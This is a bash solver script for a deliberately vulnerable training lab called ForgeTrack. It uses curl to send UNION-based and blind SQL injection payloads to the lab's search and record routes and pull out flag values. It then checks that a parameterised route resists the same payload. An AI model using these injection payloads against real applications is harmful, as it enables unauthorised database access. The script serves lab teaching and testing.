#!/usr/bin/env bash
#
# Retrieve the four database flags through the intentionally vulnerable
# routes of the ForgeTrack lab. Authorised lab use only.
#
# Usage:
#   bash get-web-flags.sh http://VM_IP
#   BASE_URL=http://VM_IP bash get-web-flags.sh
#
# Requires: curl, python3 (for the blind flag extractor).

set -euo pipefail

BASE="${1:-${BASE_URL:-http://127.0.0.1}}"
BASE="${BASE%/}"
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FLAG_RE='(RFM|THM)\{[^}]*\}'

if ! command -v curl >/dev/null 2>&1; then
  echo "ERROR: curl is required." >&2
  exit 1
fi

echo "Target: $BASE"
echo

# Six-column UNION shape used by challenges 1, 2 and 4:
#   id, build_code, name, status, car_code, notes
union_cols() {
  printf "UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='%s' -- " "$1"
}

get_flag() {
  local label="$1" body flag
  shift
  body="$(curl -sS --get "$@")" || {
    printf '%-14s ERROR (request failed)\n' "$label:"
    return 1
  }
  flag="$(printf '%s' "$body" | grep -oE "$FLAG_RE" | sort -u | head -1 || true)"
  if [[ -n "$flag" ]]; then
    printf '%-14s %s\n' "$label:" "$flag"
  else
    printf '%-14s NOT FOUND\n' "$label:"
    if [[ "${VERBOSE:-0}" == "1" ]]; then
      printf '%s\n' "$body" | head -20
    fi
  fi
}

echo "== Database flags =="

# 1. Search injection. Close the parenthesis before the UNION.
SEARCH_PAYLOAD="%' ) $(union_cols search)"
get_flag search --data-urlencode "query=$SEARCH_PAYLOAD" "$BASE/builds/search"

# 2. Numeric UNION in the build record page.
UNION_PAYLOAD="0 $(union_cols union)"
get_flag union --data-urlencode "id=$UNION_PAYLOAD" "$BASE/builds/view"

# 3. Blind boolean oracle (Python, stdlib only).
if command -v python3 >/dev/null 2>&1; then
  printf '%-14s %s\n' "blind:" "$(python3 "$HERE/get-blind-flag.py" "$BASE")"
else
  echo "blind:         SKIPPED (python3 missing)"
fi

# 4. Remediation flag, readable through the vulnerable search route.
REMEDIATION_PAYLOAD="%' ) $(union_cols remediation)"
get_flag remediation --data-urlencode "query=$REMEDIATION_PAYLOAD" "$BASE/builds/search"

# Sanity check: the parameterised route must reject the same payload.
SECURE_COUNT="$(curl -sS --get --data-urlencode "query=$SEARCH_PAYLOAD" \
  "$BASE/secure/builds/search" | grep -c 'RFM{' || true)"
echo
echo "secure route injected rows: $SECURE_COUNT (expected 0)"
echo
echo "Done. Set VERBOSE=1 to dump response bodies when a flag is missing."
